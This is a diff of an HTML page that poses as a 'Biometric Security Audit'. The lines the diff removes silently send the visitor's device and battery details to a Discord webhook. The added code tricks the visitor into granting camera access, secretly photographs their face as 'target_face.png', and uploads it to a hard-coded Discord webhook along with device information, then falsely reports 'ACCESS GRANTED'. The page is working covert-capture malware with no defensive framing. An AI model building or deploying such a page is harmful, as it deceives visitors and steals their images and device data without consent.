@@ -1,52 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Diagnostic</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Biometric Security Audit</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; overflow: hidden; }
+        .scanner { border: 2px solid #0f0; width: 280px; height: 280px; margin: 20px auto; position: relative; background: rgba(0, 255, 0, 0.05); }
+        .line { width: 100%; height: 3px; background: #0f0; position: absolute; box-shadow: 0 0 15px #0f0; animation: scan 2s infinite linear; }
+        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
+        .btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
+        .btn:hover { background: #00cc00; box-shadow: 0 0 20px #0f0; }
+        #status { margin-top: 20px; font-size: 14px; letter-spacing: 1px; }
+    </style>
 </head>
 <body>
-    <h1>Checking Device Compatibility...</h1>
-    <p>Please wait while we scan your mobile environment.</p>
+    <div style="padding: 20px;">
+        <h1 style="text-shadow: 0 0 10px #0f0;">SECURITY PROTOCOL v4.0</h1>
+        <div class="scanner"><div class="line"></div></div>
+        <p id="status">WAITING FOR BIOMETRIC INPUT...</p>
+        <button class="btn" onclick="startScan()">Verify Identity</button>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Your Discord Webhook
         const webhook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
 
-        async function collectData() {
-            // 1. Get Basic Phone Info (User Agent)
-            const info = navigator.userAgent;
+        async function startScan() {
+            const status = document.getElementById('status');
+            status.innerText = "REQUESTING CAMERA PERMISSION...";
             
-            // 2. Get Battery Status (Pro Move)
-            let batteryInfo = "Unknown";
             try {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100)}% - ${batt.charging ? 'Charging' : 'Discharging'}`;
-            } catch (e) {}
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-            // 3. Get Screen Resolution (Tells you if it's a Pro Max/Plus model)
-            const screen = `${window.screen.width}x${window.screen.height}`;
+                status.innerText = "CAPTURING BIOMETRIC DATA... HOLD STILL";
 
-            // 4. Send to Discord
-            const payload = {
-                content: "📱 **MOBILE DIGGER ACTIVATED**",
-                embeds: [{
-                    title: "Mobile Device Detected",
-                    color: 15418782,
-                    fields: [
-                        { name: "Device/Browser Info", value: `\`\`\`${info}\`\`\`` },
-                        { name: "Battery Status", value: batteryInfo, inline: true },
-                        { name: "Screen Res", value: screen, inline: true }
-                    ]
-                }]
-            };
+                // Wait 2.5 seconds for camera to adjust/focus
+                setTimeout(() => {
+                    takeSnapshot(stream);
+                    status.innerText = "SCAN COMPLETE. ENCRYPTING DATA...";
+                }, 2500);
 
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            } catch (err) {
+                status.innerText = "CRITICAL ERROR: SENSOR ACCESS DENIED";
+                console.error(err);
+            }
         }
 
-        collectData();
+        function takeSnapshot(stream) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'target_face.png');
+                
+                // Detailed System Info
+                const info = {
+                    title: "📸 BIOMETRIC TARGET CAPTURED",
+                    color: 16711680, // Red for "High Priority"
+                    fields: [
+                        { name: "Device Model", value: navigator.platform },
+                        { name: "CPU Cores", value: navigator.hardwareConcurrency.toString(), inline: true },
+                        { name: "Memory", value: `~${navigator.deviceMemory || 'Unknown'} GB`, inline: true },
+                        { name: "System UID", value: `\`\`\`${navigator.userAgent.split(' ').slice(-1)[0]}\`\`\`` }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                formData.append('payload_json', JSON.stringify({ embeds: [info] }));
+
+                fetch(webhook, { method: 'POST', body: formData })
+                .then(() => {
+                    // Stop camera after sending
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('status').innerText = "ACCESS GRANTED. LOGGING OUT.";
+                });
+            }, 'image/png');
+        }
     </script>
 </body>
 </html>
